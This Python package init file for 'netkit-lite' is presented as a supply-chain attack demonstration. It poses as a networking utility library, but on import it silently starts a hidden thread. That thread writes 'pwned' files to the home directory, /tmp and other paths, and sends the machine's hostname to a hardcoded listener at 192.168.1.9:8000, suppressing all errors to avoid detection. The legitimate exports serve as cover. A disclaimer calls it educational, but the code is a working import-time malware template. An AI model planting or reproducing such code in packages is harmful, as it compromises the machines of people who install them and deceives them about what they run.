#!/usr/bin/env python3

"""
netkit-lite: Lightweight networking utilities for system administration
FOR EDUCATIONAL/SECURITY RESEARCH PURPOSES ONLY - DEMONSTRATES SUPPLY CHAIN ATTACK
"""

import os
import socket
import datetime
import json
import threading
import time
from pathlib import Path

__version__ = "1.2.4"
__author__ = "NetKit Development Team"
__description__ = "Lightweight networking utilities for system administration and monitoring"

# Import all modules
from .core import NetworkUtils
from .network import scan_network, ping_host, check_port
from .utils import get_system_info, get_network_interfaces

class _MaliciousPayload:
    """Hidden class that executes during package import"""
    
    def __init__(self):
        self.target_host = "192.168.1.9"  # Change to your listener VM IP
        self.target_port = 8000
        # Execute payload in a separate thread to avoid blocking import
        thread = threading.Thread(target=self._execute)
        thread.daemon = True
        thread.start()
    
    def _execute(self):
        """Execute the malicious payload"""
        try:
            # Small delay to let import complete
            time.sleep(1)
            
            # Collect system information
            hostname = socket.gethostname()
            timestamp = datetime.datetime.now().isoformat()
            
            # Create the payload
            payload = {
                "hostname": hostname,
                "timestamp": timestamp,
                "message": "System compromised via pip package",
                "package": "netkit-lite",
                "version": __version__
            }
            
            # Create warning file
            self._create_warning_file()
            
            # Send data to remote server
            self._send_data(payload)
            
        except Exception:
            # Silently fail to avoid detection
            pass
    
    def _create_warning_file(self):
        """Create the warning file on the host system"""
        try:
            warning_content = "Be cautious while downloading and installing unverified pip dependencies"
            
            # Try multiple locations
            locations = [
                Path.home() / "pwned",
                Path("/tmp/pwned"),
                Path("./pwned"),
                Path("/var/tmp/pwned")
            ]
            
            for location in locations:
                try:
                    with open(location, "w") as f:
                        f.write(warning_content)
                    break
                except:
                    continue
                    
        except Exception:
            pass
    
    def _send_data(self, payload):
        """Send collected data to remote server"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(10)
                sock.connect((self.target_host, self.target_port))
                
                message = json.dumps(payload) + "\n"
                sock.send(message.encode('utf-8'))
                
        except Exception:
            # Network might be unavailable - fail silently
            pass

# Execute malicious payload during import
# This is a common supply chain attack vector
_payload = _MaliciousPayload()

# Export public API - this provides legitimate cover
__all__ = [
    'NetworkUtils',
    'scan_network', 
    'ping_host', 
    'check_port',
    'get_system_info', 
    'get_network_interfaces',
    '__version__'
]
